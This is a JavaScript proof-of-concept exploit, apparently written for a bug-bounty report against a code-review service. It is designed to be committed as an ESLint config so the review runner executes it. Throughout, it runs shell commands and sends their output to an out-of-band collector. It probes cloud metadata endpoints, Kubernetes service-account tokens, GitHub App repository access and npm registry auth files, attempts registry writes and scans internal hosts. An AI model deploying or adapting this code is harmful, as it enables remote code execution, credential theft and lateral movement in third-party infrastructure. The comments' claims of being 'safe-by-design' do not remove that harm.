// PoC: concrete internal-impact escalation from CodeRabbit review-runner RCE.
// Drop into a CodeRabbit-connected repo as eslint.config.js (or .eslintrc.js).
// Fires when CodeRabbit reviews a PR (eslint analyzer loads this config = RCE).
//
// SAFE-BY-DESIGN: never exfiltrates raw secret VALUES. Sends only
//   (a) non-secret identifiers: cloud account id / region / instance id / IAM role
//       name, GitHub-App repo names + permission bits, HTTP status codes;
//   (b) SHA256 + length + first-4-chars fingerprint of any secret found, so triage
//       can confirm a live credential exists without us ever transmitting it.
// No package poisoned: Verdaccio write test uses a throwaway scoped name and only
// records the HTTP status (201 => wormable cross-tenant, 401/403 => hardened).

const cp = require("child_process");
const crypto = require("crypto");

// >>> SET to your OOB collector (interactsh oast.fun / burp collaborator / webhook.site). <<<
const OOB = "http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me";

function sh(cmd, t = 8000) {
  try { return cp.execSync(cmd, { encoding: "utf8", timeout: t, maxBuffer: 20 * 1024 * 1024 }); }
  catch (e) { return "ERR: " + String((e && (e.stderr || e.message)) || "").slice(0, 400); }
}
function post(tag, data) {
  try {
    const b64 = Buffer.from(String(data)).toString("base64");
    sh(`curl -s --max-time 8 -X POST --data-binary ${JSON.stringify(b64)} ${JSON.stringify(OOB + "/" + tag)}`);
  } catch (_) {}
}
// safe fingerprint of a secret: proves it's real, leaks nothing usable
function fp(v) {
  if (!v) return "absent";
  const s = String(v).trim();
  return "sha256=" + crypto.createHash("sha256").update(s).digest("hex").slice(0, 16)
       + " len=" + s.length + " head=" + s.slice(0, 4);
}

(function main() {
  // 0. Prove code exec + sandbox identity
  post("A_ID", sh("id; hostname; uname -a; pwd; cat /etc/os-release 2>/dev/null | head -3"));

  // 1. Live review credentials present? Names only + safe fingerprints (NO raw values)
  post("B_ENV_NAMES", sh("env | cut -d= -f1 | sort | tr '\\n' ' '"));
  const secretVars = ["GITHUB_TOKEN","GH_TOKEN","GITLAB_TOKEN","AZURE_DEVOPS_TOKEN",
    "GHES_CONNECTOR_TOKEN","CODERABBIT_API_KEY","CODERABBIT_WORKSPACE_API_KEY",
    "HOOK_SECRET","CODERABBIT_WEBHOOK_SECRET","CONFLUENCE_MCP_TOKEN",
    "OPENAI_API_KEY","ANTHROPIC_API_KEY","GEMINI_API_KEY","GOOGLE_API_KEY"];
  post("B_SECRET_FP", secretVars.map(k => k + ": " + fp(process.env[k])).join("\n"));

  // 2. GitHub App token power, IN-BAND (report scope/repos, not the token)
  const ght = process.env.GITHUB_TOKEN || process.env.GH_TOKEN || "";
  if (ght) {
    post("C_GH_IDENTITY", sh(`curl -s --max-time 8 -H "Authorization: token ${ght}" https://api.github.com/rate_limit -D - -o /dev/null | head -20`));
    // installation/repositories => every repo this App token can touch (cross-tenant if >your own)
    post("C_GH_REPOS", sh(`curl -s --max-time 8 -H "Authorization: token ${ght}" "https://api.github.com/installation/repositories?per_page=100" | tr ',' '\\n' | grep -E '"(full_name|permissions|push|admin)"' | head -80`));
  }

  // 3. Cloud account takeover surface: IMDS (AWS) + GCP metadata — identifiers only
  post("D_AWS_ROLE", sh("curl -s --max-time 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/"));
  post("D_AWS_IDENT", sh("curl -s --max-time 4 http://169.254.169.254/latest/dynamic/instance-identity/document"));
  post("D_AWS_V2", sh(`T=$(curl -s --max-time 4 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"); curl -s --max-time 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/`));
  post("D_ECS", sh(`curl -s --max-time 4 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | head -c 60`));
  post("D_GCP", sh("curl -s --max-time 4 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id"));

  // 4. Kubernetes service-account (cluster pivot) — token fingerprint + API reachability
  post("E_K8S_SA", sh("cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null"));
  post("E_K8S_API", sh(`SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk --max-time 5 -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $SA" https://kubernetes.default.svc/api/v1/namespaces`));

  // 5. Internal Verdaccio: read (cross-tenant packages) + write test (worm potential)
  post("F_VERD_PING", sh("curl -s --max-time 5 http://10.0.0.28:4873/-/ping"));
  post("F_VERD_WHOAMI", sh("curl -s --max-time 5 http://10.0.0.28:4873/-/whoami"));
  post("F_VERD_PKGS", sh("curl -s --max-time 6 http://10.0.0.28:4873/-/all | head -c 3000"));
  post("F_VERD_WRITE", sh("curl -s --max-time 6 -o /dev/null -w '%{http_code}' -X PUT http://10.0.0.28:4873/@poc-scope-testonly%2fcr-rce-probe -H 'content-type: application/json' --data '{\"name\":\"@poc-scope-testonly/cr-rce-probe\"}'"));

  // 6. Internal network map (what else the runner can reach)
  post("G_NET", sh("cat /etc/resolv.conf 2>/dev/null; echo ---; cat /etc/hosts 2>/dev/null; echo ---; ip route 2>/dev/null || route -n 2>/dev/null"));
  post("G_MOUNTS", sh("mount 2>/dev/null | grep -viE 'proc|sysfs|cgroup|tmpfs|devpts' | head -30; echo ---; ls -la /run/secrets 2>/dev/null"));
})();

module.exports = [ { rules: {} } ];

// --- escalation probes v2: cross-boundary impact (safe: fingerprints + statuses only) ---
(function esc2(){
  // npm/registry auth material -> authenticated Verdaccio publish (real worm, not anon)
  post("H_NPMRC", sh("for f in ~/.npmrc /root/.npmrc ./.npmrc /home/*/.npmrc /usr/local/etc/npmrc; do [ -f $f ] && echo \"== $f ==\" && sed -E 's/(_authToken=|_password=|:_auth=).*/\\1<REDACTED>/' $f; done 2>/dev/null; echo NPM_TOKEN_fp=$(node -e 'const v=process.env.NPM_TOKEN||\"\";const c=require(\"crypto\");console.log(v?c.createHash(\"sha256\").update(v).digest(\"hex\").slice(0,16)+\":\"+v.length:\"absent\")')"));
  post("H_VERD_AUTH", sh("T=${NPM_TOKEN:-$(sed -nE 's/.*_authToken=(.*)/\\1/p' ~/.npmrc 2>/dev/null | head -1)}; curl -s --max-time 6 -H \"Authorization: Bearer $T\" http://10.0.0.28:4873/-/whoami; echo; curl -s --max-time 6 -o /dev/null -w 'authPUT=%{http_code}' -X PUT -H \"Authorization: Bearer $T\" -H 'content-type: application/json' http://10.0.0.28:4873/@poc-scope-testonly%2fcr-probe2 --data '{\"name\":\"@poc-scope-testonly/cr-probe2\",\"versions\":{}}'"));
  // CodeRabbit infra key validity (in-band, report status only)
  post("I_CR_KEY", sh("K=${CODERABBIT_WORKSPACE_API_KEY:-$CODERABBIT_API_KEY}; echo keyfp=$(node -e 'const v=process.env.CODERABBIT_WORKSPACE_API_KEY||process.env.CODERABBIT_API_KEY||\"\";const c=require(\"crypto\");console.log(v?c.createHash(\"sha256\").update(v).digest(\"hex\").slice(0,16)+\":\"+v.length:\"absent\")'); curl -s --max-time 6 -o /dev/null -w ' apiHTTP=%{http_code}' -H \"Authorization: Bearer $K\" https://api.coderabbit.ai/v1/report.generate 2>/dev/null"));
  // orchestrator env (PID1) secret NAMES + internal neighbor scan
  post("J_PROC1", sh("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | cut -d= -f1 | sort | tr '\\n' ' '"));
  post("J_NETSCAN", sh("bash -c 'for h in 10.0.0.28 10.0.0.1 10.0.0.2 10.0.0.10 10.0.0.20 10.0.0.27 10.0.0.29 10.0.0.30; do for p in 80 443 4873 5432 6379 8080 9200 27017 3306; do (echo > /dev/tcp/$h/$p) >/dev/null 2>&1 && echo \"$h:$p open\"; done; done' 2>/dev/null"));
})();
